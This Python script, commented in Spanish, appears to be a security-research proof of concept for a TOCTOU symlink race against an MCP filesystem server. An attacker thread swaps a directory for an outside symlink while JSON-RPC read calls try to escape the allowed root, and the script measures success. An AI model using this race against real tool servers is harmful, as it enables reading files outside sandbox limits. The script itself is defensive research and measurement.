#!/usr/bin/env python3
"""C5a — La carrera de symlinks en Linux (WSL2) contra `servers/filesystem`.

En Windows el 79 % de los intentos del atacante fallo por BLOQUEO DE FICHERO, asi que
aquella medida no concluyo (mcp-cabos-sueltos.md §5, heredado). Aqui se corre en Linux,
donde `rename`/`unlink` sobre directorios y symlinks NO tienen bloqueo obligatorio.

Mecanismo (leido en lib.ts:99-140): validatePath() resuelve `fs.realpath(absolute)`,
comprueba que el realPath cae dentro de las raices, y DEVUELVE ese realPath; luego el
handler hace readFileContent(realPath). La ventana TOCTOU esta entre la resolucion del
realpath y el read. El vector que gana: un COMPONENTE DE DIRECTORIO que es un directorio
real cuando corre realpath (asi el realPath contiene el componente literal y pasa la
comprobacion) y que el atacante convierte en SYMLINK A FUERA antes del read.

  estado A (target = dir real con secret.txt DENTRO)  -> validatePath pasa
  estado B (target = symlink -> /tmp/c5a/outside)     -> validatePath DENIEGA
  WIN: validate cae en A (pasa) y read cae en B (lee el secreto de FUERA).

Se conduce el SERVIDOR REAL (dist/index.js) por stdio JSON-RPC. Timeout duro global.
"""
import json
import os
import shutil
import subprocess
import sys
import threading
import time

BASE = "/tmp/c5a"
ALLOWED = f"{BASE}/allowed"
OUTSIDE = f"{BASE}/outside"
TARGET = f"{ALLOWED}/target"           # el componente que se conmuta
HOLD = f"{BASE}/hold_realdir"          # aparca el dir real mientras target es symlink
SERVER = "/mnt/d/Work/research/FileX/repos/mcp-refs/servers/src/filesystem/dist/index.js"
MARCA_DENTRO = "CONTENIDO-DENTRO-LEGITIMO"
MARCA_FUERA = "SECRETO-DE-FUERA-ENVENENADO"
DUR_S = float(os.environ.get("C5A_DUR", "12"))


def preparar():
    shutil.rmtree(BASE, ignore_errors=True)
    os.makedirs(OUTSIDE, exist_ok=True)
    os.makedirs(TARGET, exist_ok=True)   # estado A inicial: dir real
    # secret dentro del dir real (dentro de allowed)
    with open(f"{TARGET}/secret.txt", "w") as f:
        f.write(MARCA_DENTRO + "\n")
    # secret de fuera (fuera de allowed)
    with open(f"{OUTSIDE}/secret.txt", "w") as f:
        f.write(MARCA_FUERA + "\n")


class Atacante(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.parar = False
        self.toggles = 0

    def run(self):
        while not self.parar:
            # A -> B: aparta el dir real y pon symlink a fuera
            try:
                os.rename(TARGET, HOLD)
                os.symlink(OUTSIDE, TARGET)   # target -> /tmp/c5a/outside
                self.toggles += 1
            except OSError:
                pass
            # B -> A: quita el symlink y devuelve el dir real
            try:
                os.unlink(TARGET)
                os.rename(HOLD, TARGET)
            except OSError:
                pass


class Servidor:
    def __init__(self):
        self.p = subprocess.Popen(
            ["node", SERVER, ALLOWED],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1)
        self._id = 0

    def rpc(self, method, params=None, notify=False, timeout=10):
        if notify:
            self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "method": method,
                                           "params": params or {}}) + "\n")
            self.p.stdin.flush()
            return None
        self._id += 1
        rid = self._id
        self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": rid, "method": method,
                                       "params": params or {}}) + "\n")
        self.p.stdin.flush()
        t0 = time.time()
        while time.time() - t0 < timeout:
            linea = self.p.stdout.readline()
            if not linea:
                return {"_MUERTO": True}
            try:
                m = json.loads(linea)
            except Exception:
                continue
            if m.get("id") == rid:
                return m
        return None

    def cerrar(self):
        try:
            self.p.terminate()
            self.p.wait(timeout=5)
        except Exception:
            try:
                self.p.kill()
            except Exception:
                pass


def clasificar(resp):
    if resp is None:
        return "timeout"
    if resp.get("_MUERTO"):
        return "muerto"
    if "error" in resp:
        return "denegado"        # Access denied / ENOENT
    try:
        txt = json.dumps(resp["result"])
    except Exception:
        return "raro"
    if MARCA_FUERA in txt:
        return "WIN_FUERA"       # leyo el secreto de fuera: raiz violada
    if MARCA_DENTRO in txt:
        return "dentro"
    return "otro"


def main():
    preparar()
    srv = Servidor()
    ini = srv.rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {},
                                 "clientInfo": {"name": "c5a", "version": "0"}})
    if ini is None or ini.get("_MUERTO"):
        print(json.dumps({"error": "el servidor no arranca", "ini": ini}))
        srv.cerrar()
        return
    srv.rpc("notifications/initialized", notify=True)

    atk = Atacante()
    atk.start()

    from collections import Counter
    conteo = Counter()
    ejemplos = {}
    intentos = 0
    t0 = time.time()
    while time.time() - t0 < DUR_S:
        r = srv.rpc("tools/call", {"name": "read_text_file",
                                   "arguments": {"path": f"{TARGET}/secret.txt"}},
                    timeout=8)
        c = clasificar(r)
        conteo[c] += 1
        intentos += 1
        if c not in ejemplos and r is not None and not r.get("_MUERTO"):
            ejemplos[c] = json.dumps(r)[:300]
        if c in ("muerto", "timeout"):
            break

    atk.parar = True
    time.sleep(0.2)
    srv.cerrar()

    salida = {
        "plataforma": "linux/wsl2", "server": "servers/filesystem dist/index.js",
        "allowed_root": ALLOWED, "duracion_s": DUR_S,
        "intentos": intentos, "toggles_atacante": atk.toggles,
        "conteo": dict(conteo),
        "wins_fuera": conteo["WIN_FUERA"],
        "tasa_win_%": round(100 * conteo["WIN_FUERA"] / intentos, 3) if intentos else 0,
        "ejemplo_win": ejemplos.get("WIN_FUERA"),
        "ejemplo_denegado": ejemplos.get("denegado"),
        "ejemplo_dentro": ejemplos.get("dentro"),
    }
    print(json.dumps(salida, ensure_ascii=False, indent=2))
    out = "/mnt/d/Work/research/FileX/bench/salidas-mcp-cabos-2/c5a_symlink_linux.json"
    with open(out, "w", encoding="utf-8") as f:
        json.dump(salida, f, ensure_ascii=False, indent=2)
    shutil.rmtree(BASE, ignore_errors=True)


if __name__ == "__main__":
    main()
